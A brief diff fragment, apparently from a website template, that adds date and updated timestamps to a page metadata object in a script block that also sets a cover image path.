+          date: "Thu Jun 11 2026 14:02:43 GMT+0800",
+          updated: "Thu Jun 11 2026 15:33:22 GMT+0800",
           cover: "/images/bannner.webp",
         };
       </script>
